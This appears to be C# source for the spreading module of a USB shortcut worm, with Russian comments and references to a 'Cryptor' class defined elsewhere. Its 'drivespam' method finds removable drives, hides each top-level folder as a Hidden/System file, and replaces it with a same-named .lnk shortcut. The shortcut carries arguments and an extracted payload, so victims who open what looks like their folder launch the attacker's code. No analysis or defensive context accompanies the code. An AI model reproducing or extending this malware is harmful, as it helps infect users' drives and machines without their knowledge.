using IWshRuntimeLibrary;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;

namespace ConsoleApp1
{
    class link : Program
    {
        public static void drivespam()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Removable)
                {


                    foreach (var file in Directory.GetDirectories(drive.Name, "*", SearchOption.TopDirectoryOnly))
                    {
                        WshShell shell = new WshShell();
                        DirectoryInfo dir = new DirectoryInfo(file);
                        if (drive.Name == file)
                        { break; }
                        //путь к ярлыку                      
                        string shortcutPath = drive.Name + dir.Name + ".lnk";
                        //создаем объект ярлыка
                        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
                        Cryptor.Extract("3", shortcutPath);
                        System.IO.File.SetAttributes(file, System.IO.FileAttributes.Hidden | FileAttributes.System);
                        shortcut.Hotkey = "Ctrl+Shift+A";
                        shortcut.Arguments = atribdir + dir.Name + atribkey;
                        shortcut.TargetPath = file;
                        //Создаем ярлык
                        shortcut.Save();
                    }                    
                }
                else { Console.WriteLine("флешка не обноруженна"); }
            }
        }
    }
}
